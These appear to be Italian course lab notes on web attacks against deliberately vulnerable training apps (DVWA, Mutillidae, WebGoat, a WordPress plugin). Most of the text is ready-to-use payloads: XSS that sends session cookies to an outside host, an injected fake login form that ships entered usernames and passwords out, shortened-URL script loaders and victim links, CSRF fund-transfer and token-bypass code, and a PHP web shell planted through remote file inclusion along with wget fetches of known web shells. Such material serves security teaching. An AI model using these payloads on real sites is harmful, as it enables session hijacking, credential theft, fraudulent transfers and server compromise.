*************************
*************************
*************************
XSS Reflected

in DVWA: 

• test con html (visualizzazione sorgente, anche in url)

<H1>testo</H1>










• test scripting

<script>alert('Testo')</script>







*************************
Furto dei cookie di sessione
*************************




• codice javascript per l'estrazione dei cookie [test nella console di firebug]

document.cookie

<script>alert(document.cookie)</script>






• creazione di una immagine che fa partire una richiesta HTTP verso la pagina di cattura dei dati

	- test con il codice html per una immagina
	<img src="http://cris.unimore.it/fakeimg.jpg?stolen=datirubati">






	- alert della stringa
<script>evil_url="http://cris.unimore.it/fakeimg.jpg&stolen="; evil_url+=document.cookie; alert(evil_url); </script>

<script>
evil_url="http://cris.unimore.it/fakeimg.jpg&stolen="; 
evil_url+=document.cookie; 
alert(evil_url);
</script>





http://cris.unimore.it/fakeimg.jpg&stolen=security=low; security=low; PHPSESSID=b926kblllsk6s6uhu4jehtunn0; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; JSESSIONID=A985F9EDEAA5599AB8BCC69DF829795D








	- scrittura dell'immagine nel documento
<script>evil_url="https://cris.unimore.it/fakeimg.jpg?stolen="; evil_url+=document.cookie; document.write("<img src=\""+evil_url+"\">"); </script>


http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Eevil_url%3D%22https%3A%2F%2Fcris.unimore.it%2Ffakeimg.jpg%3Fstolen%3D%22%3B%20evil_url%2B%3Ddocument.cookie%3B%20document.write(%22%3Cimg%20src%3D%5C%22%22%2Bevil_url%2B%22%5C%22%3E%22)%3B%20%3C%2Fscript%3E


http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=<script>evil_url="https://cris.unimore.it/fakeimg.jpg?stolen="; evil_url+=document.cookie; document.write("<img src=\""+evil_url+"\">"); </script>









*************************
Furto di username e password
*************************








• creazione di un form







<form><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" id="user" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login"></form>

• nascondiamo il form precedente






<form><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" id="user" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login"></form>
<script>document.getElementsByName("XSS")[0].style.visibility="hidden";</script>

PRENDE l'elemento XSS e lo setta come hidden. Dovresti capire effettivamente qual è il nome dell'elemento sulla pagina. in questo caso, tu lo rendi solo non hidden.

• solo alert







<script>function hack(){ stringa="username = "+ document.forms[1].user.value + ", password =" + document.forms[1].pass.value + ""; alert(stringa);} document.getElementsByName("XSS")[0].style.visibility="hidden"; </script><form><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" id="user" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR> 


• alert dell'evil url







<script>function hack(){
  stringa="?username="+ document.forms[1].user.value + "&password=" + document.forms[1].pass.value + ""; 
  evil_url="http://attacker"+ stringa + ""; 
  alert(evil_url) }
  
  document.getElementsByName("XSS")[0].style.visibility="hidden";

</script>

<form>
<br><br><HR><H3>This feature requires account login:</H3 >
<br><br>Enter Username:<br>
<input type="text" id="user" name="user">
<br>Enter Password:<br><input type="password" name = "pass"><br>
<input type="submit" name="login" value="login" onclick="hack()">
</form>
<br><br><HR>





• attacco completo







<script>function hack(){stringa="?username="+ document.forms[1].user.value + "&password=" + document.forms[1].pass.value + ""; evil_url="http://cris.unimo.it/fakeimage.img"+ stringa + ""; document.write("<img src=\"" + evil_url + "\">") } document.getElementsByName("XSS")[0].style.visibility="hidden";</script><form><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" id="user" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>







 - versione con solo la stampa della stringa statica per dimostrare il funzionamento con una immagine esistente
<script>function hack(){document.write("<img src=\"http://upload.wikimedia.org/wikipedia/en/b/bc/Wiki.png\"\>"); } </script><form><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" id="user" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>








- versione con XMLHTTPRequest per effettuare richieste asincrone
NOTA: protezione Same Origin!






<script>function hack(){stringa="?username="+ document.forms[1].user.value + "&password=" + document.forms[1].pass.value + ""; evil_url="http://cris.unimo.it/fakeimage.img"+ stringa + ""; async_request= new XMLHTTPRequest(); async_request.open("GET",evil_url,"true"); async_request.send();alert(evil_url)} document.getElementsByName("XSS")[0].style.visibility="hidden";</script><form><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" id="user" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>







- versione con aggiunta di img al body







<script>function hack(){stringa="?username="+ document.forms[1].user.value + "&password=" + document.forms[1].pass.value + ""; evil_url="http://cris.unimo.it/fakeimage.img"+ stringa + ""; var evilimg=document.createElement('img'); evilimg.setAttribute("src",evil_url); document.body.appendChild(evilimg);} document.getElementsByName("XSS")[0].style.visibility="hidden";</script><form><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" id="user" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>







- attacco completo (da raffinare)







<script>function hack(){stringa="?username="+ document.forms[1].user.value + "&password=" + document.forms[1].pass.value + ""; evilurl="http://cris.unimo.it/fakeimage.img"+ stringa + ""; var evilimg=document.createElement('img'); evilimg.setAttribute("src", evilurl); evilimg.setAttribute("display","none"); document.body.appendChild(evilimg); document.getElementsByName("XSS")[0].style.visibility="visible"; injectedform=document.getElementById("injectedform"); injectedform.style.visibility="hidden";} document.getElementsByName("XSS")[0].style.visibility="hidden";</script>

<form id="injectedform"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" id="user" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="button" name="login" value="login" onclick="hack()"></form><br><br><HR>







- attacco completo, URLencoded







%3Cscript%3Efunction%20hack()%7Bstringa%3D%22%3Fusername%3D%22%2B%20document.forms%5B1%5D.user.value%20%2B%20%22%26password%3D%22%20%2B%20document.forms%5B1%5D.pass.value%20%2B%20%22%22%3B%20evilurl%3D%22http%3A%2F%2Fcris.unimo.it%2Ffakeimage.img%22%2B%20stringa%20%2B%20%22%22%3B%20var%20evilimg%3Ddocument.createElement(%27img%27)%3B%20evilimg.setAttribute(%22src%22%2C%20evilurl)%3B%20evilimg.setAttribute(%22display%22%2C%22none%22)%3B%20document.body.appendChild(evilimg)%3B%20document.getElementsByName(%22XSS%22)%5B0%5D.style.visibility%3D%22visible%22%3B%20injectedform%3Ddocument.getElementById(%22injectedform%22)%3B%20injectedform.style.visibility%3D%22hidden%22%3B%7D%20document.getElementsByName(%22XSS%22)%5B0%5D.style.visibility%3D%22hidden%22%3B%3C%2Fscript%3E%3Cform%20id%3D%22injectedform%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis%20feature%20requires%20account%20login%3A%3C%2FH3%20%3E%3Cbr%3E%3Cbr%3EEnter%20Username%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20id%3D%22user%22%20name%3D%22user%22%3E%3Cbr%3EEnter%20Password%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%20%3D%20%22pass%22%3E%3Cbr%3E%3Cinput%20type%3D%22button%22%20name%3D%22login%22%20value%3D%22login%22%20onclick%3D%22hack()%22%3E%3C%2Fform%3E%3Cbr%3E%3Cbr%3E%3CHR%3E







- URL da inviare alla vittima







http://172.25.1.116/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efunction%20hack()%7Bstringa%3D%22%3Fusername%3D%22%2B%20document.forms%5B1%5D.user.value%20%2B%20%22%26password%3D%22%20%2B%20document.forms%5B1%5D.pass.value%20%2B%20%22%22%3B%20evilurl%3D%22http%3A%2F%2Fcris.unimo.it%2Ffakeimage.img%22%2B%20stringa%20%2B%20%22%22%3B%20var%20evilimg%3Ddocument.createElement(%27img%27)%3B%20evilimg.setAttribute(%22src%22%2C%20evilurl)%3B%20evilimg.setAttribute(%22display%22%2C%22none%22)%3B%20document.body.appendChild(evilimg)%3B%20document.getElementsByName(%22XSS%22)%5B0%5D.style.visibility%3D%22visible%22%3B%20injectedform%3Ddocument.getElementById(%22injectedform%22)%3B%20injectedform.style.visibility%3D%22hidden%22%3B%7D%20document.getElementsByName(%22XSS%22)%5B0%5D.style.visibility%3D%22hidden%22%3B%3C%2Fscript%3E%3Cform%20id%3D%22injectedform%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis%20feature%20requires%20account%20login%3A%3C%2FH3%20%3E%3Cbr%3E%3Cbr%3EEnter%20Username%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20id%3D%22user%22%20name%3D%22user%22%3E%3Cbr%3EEnter%20Password%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%20%3D%20%22pass%22%3E%3Cbr%3E%3Cinput%20type%3D%22button%22%20name%3D%22login%22%20value%3D%22login%22%20onclick%3D%22hack()%22%3E%3C%2Fform%3E%3Cbr%3E%3Cbr%3E%3CHR%3E






- ottimizzazioni: tutto nello script





invece di fare document.write() per sostituire la pagina


<script>
function hack(){
  stringa="?username="+ document.forms[1].user.value + "&password=" + document.forms[1].pass.value + ""; 
  evilurl="http://cris.unimo.it/fakeimage.img"+ stringa + ""; 
  var evilimg=document.createElement('img');
  evilimg.setAttribute("src", evilurl);
  evilimg.setAttribute("display","none");
  document.body.appendChild(evilimg); 
  document.getElementsByName("XSS")[0].style.visibility="visible"; 
  injectedform=document.getElementById("injectedform"); //injected form è fil form, questa funzione viene chiamata quando si clicca su submit
  injectedform.style.visibility="hidden";
} 

document.getElementsByName("XSS")[0].style.visibility="hidden"; //QUESTA VIENE ESEGUITA PRIMAAAA DELLA FUNZIONE
/*qua si sta scrivendo il form tramite "document.write() quindi dobbiamo in realtà quotare le tramite \ le virgolette"*/
document.write("<form id=\"injectedform\"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type=\"text\" id=\"user\" name=\"user\"><br>Enter Password:<br><input type=\"password\" name = \"pass\"><br><input type=\"button\" name=\"login\" value=\"login\" onclick=\"hack()\"></form><br><br><HR>")</script>








- ottimizzazioni: carico lo script da un file esterno







<script src="http://cris.unimore.it/xscdpoi.js"></script>







- ottimizzazioni: uso un URL shortener







<script src="http://goo.gl/89fKC5"></script>







- ottimizzazioni: confido nella capacità del browser di interpretare quello che scrivo





<script src="//goo.gl/89fKC5"></script>


<script src=//goo.gl/89fKC5></script>





	- url da inviare alla vittima:





	http://172.25.1.116/dvwa/vulnerabilities/xss_r/?name=<script src=//goo.gl/89fKC5></script>







- riutilizzo di URL shortener






http://goo.gl/2mI8OR







********
Mutillidae: XSS mediante parametro post






- cris.unimo.it/ewurtt.html








sorgenti della pagina:

<html>
        <head>
                <title>Pagina di test per XSS su parametro post</title>
        </head>
        <body onload="eXSSploit.submit();">

                <form action="http://172.25.1.116/mutillidae/index.php?page=dns-lookup.php" method="post" name="eXSSploit">
                        <input name="target_host" value="<script>alert('Exploited XSS through a POST parameter!')</script>">
                        <input name="dns-lookup-php-submit-button" value="Lookup+DNS">
                </form>
        </body>
</html>





*************************
*************************
*************************







XSS stored

• esempio attacco stored

- mutillidae, persistent, blog

- mutillidae, persistent, show log









	nel campo page viewed vengono scritti i comandi eseguiti dalla pagina DNS lookup
	nel campo browser agent 










*************************
*************************
*************************
CSRF


• CSRF "semplice"







<img height="1" width="1" src="http://172.25.1.116/WebGoat/attack?Screen=XX&menu=YY&transferFunds=4321">






• CSRF con prompt bypass




 - come caso precedente 





<img height="1" width="1" src="http://172.25.1.116/WebGoat/attack?Screen=XX&menu=YY&transferFunds=4321">
non funziona





visualizziamo il risultato dell'invocazione di: http://172.25.1.116/WebGoat/attack?Screen=XX&menu=YY&transferFunds=4321






- primo test con iframe





<iframe src="http://172.25.1.116/WebGoat/attack?Screen=45&menu=900&transferFunds=4321"></iframe>





- serve un modo per fare partire una seconda richiesta, dopo il caricamento della prima richiesta
 usiamo la proprietà onload di iframe





<iframe id="injected_frame" src="http://172.25.1.116/WebGoat/attack?Screen=45&menu=900&transferFunds=4321" onload="document.getElementById('injected_frame').src='http://172.25.1.116/WebGoat/attack?Screen=45&menu=900&transferFunds=CONFIRM';"></iframe>







• CSFR con token bypass




<script>
function readFrame1()
{
    var frameDoc = document.getElementById("frame1").contentDocument;
    var form = frameDoc.getElementsByTagName("Form")[1];
    var token = form.CSRFToken.value;
    alert(token);
    tokenvalue = '&CSRFToken='+token;
    loadFrame2();
}

function loadFrame2()
{
    var testFrame = document.getElementById("frame2");
    testFrame.src="http://172.25.1.116/WebGoat/attack?Screen=2&menu=900&transferFunds=4000"+tokenvalue;	
}
</script>





<iframe src="http://172.25.1.116/WebGoat/attack?Screen=2&menu=900&transferFunds=main" onload="readFrame1();" id="frame1"></iframe>
<iframe id="frame2"></iframe>

*************************
*************************
*************************







RFI in WordPress

vulnerabilità RFI in 

path POC: 





http://www.example.com/mygallery/myfunctions/mygallerybrowser.php?myPath=attacker site 

path Vittima:





http://172.25.1.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php

sito ufficiale di mygallery:






http://www.wildbits.de/mygallery/

script che, una volta eseguito dal server vittima, crea la semplice webshell






<?php
        $webhsell="<? system(\$_GET['cmd']) ?>";
        $filename="simplewebshell.txt";
        file_put_contents($filename,$webshell);
        print('payload creato '.$filename.' '.$webshell);
?>



scaricamento dwlla Webshell WSO





?cmd=wget https://github.com/downloads/orbweb/PHP-SHELL-WSO/wso2.5.1.php
?cmd=wget http://b374k-shell.googlecode.com/files/b374k-2.7.php





